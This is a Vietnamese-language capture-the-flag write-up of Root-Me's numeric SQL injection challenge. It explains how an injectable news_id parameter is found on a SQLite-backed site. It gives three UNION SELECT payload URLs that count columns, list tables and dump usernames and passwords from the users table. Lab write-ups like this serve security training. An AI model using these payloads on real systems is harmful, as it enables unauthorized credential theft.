# WRITE UP

**Challenge:** [SQL injection - Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric)

<img src="./media/image1.png" style="width:6.5in;height:1.55208in" alt="Shape Description automatically generated with low confidence" />

Thử bypass qua login thì không thể thực hiện được.

<img src="./media/image2.png" style="width:6.5in;height:1.70278in" alt="Shape Description automatically generated with medium confidence" />

Kiểm tra các thẻ khác trong Home vì nhận thấy điều đặc biệt rằng, 3 link này đều dẫn đến **action=news&news\_id=\[x\].** Thử xóa id của news thì phát hiện database bị lỗi:

<img src="./media/image3.png" style="width:6.5in;height:2.35903in" alt="Graphical user interface, text, application Description automatically generated" />

Database của server là SQLite3. Tương tự bài SQL Injection – String, ta thực hiện inject nó để tìm ra admin. Ta dò được số cột là 3:

<img src="./media/image4.png" style="width:6.5in;height:1.77778in" alt="Graphical user interface, text, application Description automatically generated" />

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,1,1 from sqlite\_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,1%20from%20sqlite_master)

Ta dò được có 2 bảng users và news:

<img src="./media/image5.png" style="width:6.5in;height:1.88889in" alt="Graphical user interface, text, application Description automatically generated" />

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,1,name from sqlite\_master](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,1,name%20from%20sqlite_master)

Tương tự bài String, ta show ra được username và password của users:

<img src="./media/image6.png" style="width:6.5in;height:2.3in" alt="Graphical user interface, text, application Description automatically generated" />

Payload: [challenge01.root-me.org/web-serveur/ch18/?action=news&news\_id=1 union select 1,username,password from users](http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20union%20select%201,username,password%20from%20users)

Login vào thành công:

<img src="./media/image7.png" style="width:6.5in;height:1.95764in" alt="Graphical user interface, text, application Description automatically generated" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
